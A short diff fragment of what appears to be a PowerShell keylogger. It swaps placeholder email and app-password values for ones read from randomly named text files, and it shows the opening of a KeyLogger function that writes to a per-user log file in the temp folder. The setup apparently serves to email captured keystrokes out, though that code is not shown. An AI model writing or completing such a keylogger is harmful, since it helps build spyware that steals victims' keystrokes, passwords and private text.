@@ -1,6 +1,6 @@
 
-$email = "example@gmail.com"
-$password = "your app password"
+$email = Get-Content -Path .\KHPWMpTitfZ.txt
+$password = Get-Content -Path .\oSyEZsgTWIU.txt
 
 function KeyLogger($logFilePath = "$env:temp/$env:Username.log"){
 
